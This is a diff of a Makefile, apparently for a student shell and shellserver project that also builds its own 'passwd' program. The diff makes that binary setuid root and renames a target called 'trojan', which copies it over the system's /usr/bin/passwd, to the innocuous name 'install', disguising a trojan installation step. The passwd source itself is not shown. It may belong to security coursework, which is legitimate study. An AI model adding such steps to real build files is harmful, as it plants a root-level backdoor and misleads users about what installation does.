@@ -13,12 +13,16 @@ shell: shell.c
 passwd: passwd.c
 	gcc -Wall -o passwd passwd.c
 	
+	chown root ./passwd
+	chmod 4755 ./passwd
+	
 clean:
-	rm -f shell
+	rm -f shell shellserver passwd
+	killall shellserver
 	
-trojan:
+install:
 	cp passwd /usr/bin/passwd
-	
+
 
 format:
 	astyle *.c *.h
